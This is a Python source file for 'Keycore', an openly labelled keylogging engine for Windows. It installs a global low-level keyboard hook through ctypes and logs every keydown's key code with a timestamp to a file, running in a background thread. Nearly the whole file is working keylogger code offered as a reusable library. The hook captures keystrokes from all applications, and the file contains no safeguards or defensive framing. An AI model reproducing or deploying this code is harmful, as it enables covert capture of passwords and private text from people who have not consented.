##Copyright (C) 2020  Aitor Santoro
##
##    This program is free software: you can redistribute it and/or modify
##    it under the terms of the GNU General Public License as published by
##    the Free Software Foundation, either version 3 of the License, or
##    (at your option) any later version.
##
##    This program is distributed in the hope that it will be useful,
##    but WITHOUT ANY WARRANTY; without even the implied warranty of
##    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
##    GNU General Public License for more details.
##
##    You should have received a copy of the GNU General Public License
##    along with this program.  If not, see <https://www.gnu.org/licenses/>.


__VERSION__ = 1.0
__AUTHOR__ = "Aitor Santoro <torsw@protonmail.com>"
__LICENSE__ = "GNU GPLv3"


import ctypes
import ctypes.wintypes as wintypes

import pathlib
import os
import sys
import time
import threading

import genutils
from genutils import colorprint

# Redefinitions to help improve readability (...Readabilty Counts...)
# == Low Level keyboard and stuff like that == #
WH_KEYBOARD_LL = ctypes.c_int(13)
WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, WM_SYSKEYUP = 256, 257, 260, 261
VK_SHIFT,VK_CONTROL,VK_ALT = 0x10, 0x11, 0x12

# Redefinition that make the code look clearer
LRESULT = wintypes.LPARAM
user32 = ctypes.WinDLL("user32.dll",use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32.dll",use_last_error=True)

SetWindowsHookEx = user32.SetWindowsHookExW
CallNextHookEx = user32.CallNextHookEx
GetAsyncKeyState, GetKeyState = user32.GetAsyncKeyState, user32.GetKeyState
# ============================================ #

# Keyboard Low Level Struct...
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode",wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
        ]


# ...and a pointer to it.
LPKBDLLHOOKSTRUCT = ctypes.POINTER(KBDLLHOOKSTRUCT)

# Define Callback
HOOKPROC = ctypes.WINFUNCTYPE(LRESULT, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
HOOKPROC = ctypes.WINFUNCTYPE(LRESULT, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
LowLevelKeyboardProc = HOOKPROC

# Specify the return type and arguments 
SetWindowsHookEx.restype = wintypes.HHOOK 
SetWindowsHookEx.argtypes = (
    ctypes.c_int, #idHook
    HOOKPROC,     #lpfn
    wintypes.HINSTANCE,    #hmod
    wintypes.DWORD,        #dwThreadId
    )

CallNextHookEx.restype = LRESULT
CallNextHookEx.argtypes= (
    wintypes.HHOOK,        #idHook
    ctypes.c_int, #nCode
    wintypes.WPARAM,       #wParam
    wintypes.LPARAM,       #lParam
    )
MessageBox = user32.MessageBoxW




@LowLevelKeyboardProc
def LLKeyboardProc(nCode, wParam, lParam):
    pKBSTRUCT = ctypes.cast(lParam, LPKBDLLHOOKSTRUCT)[0]
    try:
    # * If a keydown is detected
        if wParam == WM_KEYDOWN:
            logfile = open(LOGFILE, "a+")
            logfile.write(
                f"Keycore {pKBSTRUCT.vkCode} {time.strftime('%H:%M:%S')}\n"
                )
            logfile.close()
        
    except Exception as ERR:
        print(str(ERR))
    return CallNextHookEx(None,nCode,wParam,lParam)

class Keycore:
    '''Keycore V1
    
Description
-----------
    Keycore is an "engine" that can connect your Python script
    to the MS Windows routines and messages system, specifically
    to the keystroke system, also called "LowLevelKeyboardHook"
    
Author: Aitor Santoro
Version: 1.0
License: GNU GPLv3
    '''
    def __init__(self):
        super().__init__()
        
    def start(self, logfile="logfile.txt", verbose = False):
        """Start the keylogger

    Parameters
    ----------
    logfile: string
        The log filename to write to (This will be transformed to abs path)
        
    verbose: bool
        Make more verbose this function.

    Returns
    -------
    int
        If the function succeed it should return 0

        """     
        global LOGFILE
        LOGFILE = os.path.abspath(pathlib.Path(logfile))
        
        self.hHook = SetWindowsHookEx(
            WH_KEYBOARD_LL,
            LLKeyboardProc,
            None,
            0
            )
        
        msg = wintypes.MSG()
        if verbose:
            MessageBox(
                None,
                "Keylogger is ON",
                "Keycore message",
                0
            )
        self.running = True
        while user32.PeekMessageW(ctypes.byref(msg), None, 0, None, None) > 0:
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
            if self.running == False:
                break
          
        user32.UnhookWindowsHookEx(self.hHook)
        if verbose:
            MessageBox(
                None,
                "Keylogger will shut down",
                "Keycore message",
                0)

    def start_keylogger(self, logfile="logfile.txt", verbose = False):
        self.kc_thread = threading.Thread(
            name = 'keycore_thread',
            target = self.start,
            args = (
                logfile,
                verbose
                )
            )
        self.kc_thread.start()
        
        return self.kc_thread
        
    def stop(self):
        self.running = False

if __name__ == "__main__":
    colorprint('Keycore V1 - A keylogging engine', 'cyan')
    colorprint('\nAuthor: torswq', 'yellow')
    colorprint('Version: ', 'yellow', 'bold', end='')
    colorprint(' 1.0', 'green')
    keyc = Keycore()
    kc = keyc.start_keylogger(verbose = True)
    while input() != 'quit':
        pass
    keyc.stop()
    sys.exit(0)
    
        
    
    
